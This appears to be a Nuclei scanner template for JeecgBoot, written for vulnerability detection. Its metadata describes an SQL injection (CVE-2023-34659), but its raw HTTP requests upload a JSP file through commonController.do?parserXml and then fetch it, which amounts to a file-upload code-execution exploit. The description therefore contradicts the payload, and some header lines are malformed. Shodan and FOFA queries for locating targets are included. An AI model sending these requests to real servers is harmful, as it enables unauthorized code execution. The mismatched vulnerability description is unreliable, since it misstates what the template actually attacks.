id: jeecgboot-commonController-upload

info:
  name: JeecgBoot 3.5.0 - SQL Injection
  author: ritikchaddha
  severity: critical
  description: |
    jeecg-boot 3.5.0 and 3.5.1 have a SQL injection vulnerability the id parameter of the /jeecg-boot/jmreport/show interface.
  impact: |
    Successful exploitation of this vulnerability could allow an attacker to execute arbitrary SQL queries, potentially leading to unauthorized access, data leakage, or data manipulation.
  remediation: |
    Upgrade JeecgBoot to a patched version or apply the necessary security patches provided by the vendor.
  reference:
    - https://github.com/jeecgboot/jeecg-boot/issues/4976
    - https://nvd.nist.gov/vuln/detail/CVE-2023-34659
    - https://github.com/izj007/wechat
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2023-34659
    cwe-id: CWE-89
    epss-score: 0.91195
    epss-percentile: 0.99635
    cpe: cpe:2.3:a:jeecg:jeecg_boot:3.5.0:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: jeecg
    product: jeecg_boot
    shodan-query: http.favicon.hash:1380908726
    fofa-query: icon_hash=1380908726
  tags: jeecgboot
variables:
  filename: "{{to_lower(rand_base(5))}}"
  string: "{{randstr}}"
http:
  - raw:
      - |
        POST /jeecg-boot/api/../commonController.do?parserXml HTTP/1.1
        Host: {{Hostname}}
        Accept-Encoding: gzip, deflate
        Content-Length: 463
        User-Agent: Mozilla/2.0 (compatible; MSIE 3.01; Windows 95
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarygcflwtei
        Connection: close

        ------WebKitFormBoundarygcflwtei
        Content-Disposition: form-data; "name="name"

        zW9YCa.png
        ------WebKitFormBoundarygcflwtei
        ontent-Disposition: form-data; name="documentTitle"

        blank
        ------WebKitFormBoundarygcflwtei
        Content-Disposition: form-data; name="file"; filename="{{filename}}.jsp"
        Content-Type: image/png

        <% out.println("{{string}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
        ------WebKitFormBoundarygcflwtei--
      - |
        GET /{{filename}}.jsp HTTP/1.1
        Host: {{Hostname}}
        Accept-Encoding: gzip, deflate
        User-Agent: Mozilla/2.0 (compatible; MSIE 3.01; Windows 95
        Connection: close
    matchers:
      - type: word
        part: body_2
        words:
          - "{{string}}"